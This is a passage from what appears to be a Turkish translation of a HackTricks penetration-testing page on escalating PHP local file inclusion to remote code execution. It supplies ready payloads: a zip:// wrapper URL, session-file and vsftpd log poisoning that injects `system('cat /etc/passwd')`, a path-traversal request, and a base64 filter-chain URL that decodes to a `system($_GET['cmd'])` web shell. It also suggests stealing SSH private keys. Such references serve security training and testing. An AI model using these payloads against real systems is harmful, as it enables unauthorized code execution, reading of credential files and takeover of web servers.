PHP kabuğunu içeren sıkıştırılmış bir ZIP dosyası yükleyin ve erişin:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### PHP oturumları aracılığıyla

Websitesinin PHP Oturumu (PHPSESSID) kullanıp kullanmadığını kontrol edin
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
PHP'de bu oturumlar _/var/lib/php5/sess\\_\[PHPSESSID]\_ dosyalarına kaydedilir.
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Belirtilen kodu içeren çerez ayarlayın: `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
LFI kullanarak PHP oturum dosyasını dahil etmek için aşağıdaki adımları izleyebilirsiniz:

1. Hedef web uygulamasında Local File Inclusion (LFI) zafiyeti bulunmalıdır.
2. LFI zafiyetini kullanarak PHP oturum dosyasını dahil etmek için uygun yol belirleyin.
3. Belirlenen yol üzerinden PHP oturum dosyasını dahil etmek için LFI payload'ınızı oluşturun.
4. Payload'ı hedef web uygulamasına göndererek PHP oturum dosyasını başarıyla dahil edin.
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### SSH üzerinden

Eğer ssh etkinse hangi kullanıcının kullanıldığını kontrol edin (/proc/self/status & /etc/passwd) ve **\<HOME>/.ssh/id\_rsa** dosyasına erişmeyi deneyin.

### **vsftpd** _**logları**_ üzerinden

FTP sunucusu vsftpd için loglar _**/var/log/vsftpd.log**_ konumundadır. Bir Yerel Dosya Dahil Etme (LFI) zafiyetinin var olduğu senaryoda ve açık bir vsftpd sunucusuna erişim mümkün olduğunda, aşağıdaki adımlar düşünülebilir:

1. Giriş işlemi sırasında kullanıcı adı alanına bir PHP yüklemesi enjekte edin.
2. Enjeksiyondan sonra, LFI'ı kullanarak _**/var/log/vsftpd.log**_ konumundaki sunucu loglarını alın.

### PHP base64 filtresi üzerinden (base64 kullanarak)

[Şu](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) makalede gösterildiği gibi, PHP base64 filtresi sadece Base64 dışındakileri yok sayar. Dosya uzantısı kontrolünü atlatmak için bunu kullanabilirsiniz: Eğer base64 ile ".php" ile biten bir şey sağlarsanız, sadece "." işaretini yok sayacak ve "php"i base64'e ekleyecektir. İşte bir örnek yük:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Php filtreleri aracılığıyla (dosya gerekli değil)

Bu [**makale**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d), **php filtrelerini kullanarak keyfi içerik oluşturabileceğinizi** açıklar. Bu temelde, **bir dosyaya yazmadan** dahil etmek için **keyfi php kodu oluşturabilirsiniz**.

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### Segmentasyon hatası aracılığıyla

`/tmp` içinde **geçici olarak** saklanacak bir dosya **yükleyin**, ardından **aynı istekte**, bir **segmentasyon hatası** tetikleyin ve ardından **geçici dosya silinmeyecek** ve onu arayabilirsiniz.

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Nginx geçici dosya depolama aracılığıyla

Bir **Yerel Dosya Dahil Etme** bulduysanız ve **Nginx** PHP'nin önünde çalışıyorsa aşağıdaki teknikle RCE elde edebilirsiniz:

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### PHP\_SESSION\_UPLOAD\_PROGRESS aracılığıyla

Bir **Yerel Dosya Dahil Etme** bulduysanız ve hatta bir **oturumunuz yoksa** ve `session.auto_start` `Off` ise bile. **`PHP_SESSION_UPLOAD_PROGRESS`**'ı **multipart POST** verilerinde sağlarsanız, PHP **oturumu sizin için etkinleştirir**. Bu, RCE elde etmek için kötüye kullanılabilir:

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### Windows'ta geçici dosya yüklemeleri aracılığıyla

Bir **Yerel Dosya Dahil Etme** bulduysanız ve sunucu **Windows** üzerinde çalışıyorsa RCE elde edebilirsiniz:

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### phpinfo() (file\_uploads = on) aracılığıyla

Bir **Yerel Dosya Dahil Etme** bulduysanız ve file\_uploads = on olan bir dosyayı açıklayan **phpinfo()** ile karşılaşırsanız RCE elde edebilirsiniz:

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Yol Açığını Açığa Çıkarma

Bir **Yerel Dosya Dahil Etme** bulduysanız ve geçici dosyanın yolunu **dışa çıkarabilirseniz** ANCAK **sunucu**, **dahil edilecek dosyanın PHP işaretlerine sahip olup olmadığını kontrol ediyorsa**, bu **Yarış Koşulu** ile bu kontrolü **atlamayı** deneyebilirsiniz:

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### Sonsuz bekleyiş + kaba kuvvet aracılığıyla

LFI'yi **geçici dosyalar yüklemek** için kötüye kullanabilir ve sunucuyu **PHP yürütmesini askıya alacak şekilde** yapabilirsiniz, ardından saatler boyunca geçici dosyayı bulmak için **dosya adlarını kaba kuvvet uygulayabilirsiniz**:

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### Ölümcül Hata Yoluyla

`/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar` dosyalarından herhangi birini dahil ederseniz. (Bu hatayı atmak için aynı dosyayı 2 kez dahil etmeniz gerekir).

**Bu nasıl yararlı olacağını bilmiyorum ama olabilir.**\
_Eğer bir PHP Ölümcül Hatası oluşturursanız, yüklenen PHP geçici dosyaları silinir._

<figure><img src="../../.gitbook/assets/image (1031).png" alt=""><figcaption></figcaption></figure>

## Referanslar

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\\
* [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katılarak deneyimli hackerlar ve ödül avcıları ile iletişim kurun!

**Hacking İçgörüleri**\
Hacking'in heyecanını ve zorluklarını inceleyen içeriklerle etkileşime girin

**Gerçek Zamanlı Hack Haberleri**\
Hızlı tempolu hacking dünyasını gerçek zamanlı haberler ve içgörülerle takip edin

**En Son Duyurular**\
Yeni ödül avcılarının başlatılmasını ve önemli platform güncellemelerini takip edin

Bugün [**Discord**](https://discord.com/invite/N3FrSbmwdy) üzerindeki en iyi hackerlarla işbirliğine başlayın!

<details>

<summary><strong>Sıfırdan kahraman olacak şekilde AWS hackleme becerilerini öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek veya HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **💬 [Discord grubuna](https://discord.gg/hRep4RUj7f) veya [telegram grubuna](https://t.me/peass) katılın veya** Twitter'da 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**'u takip edin.**
* **Hacking hilelerinizi paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
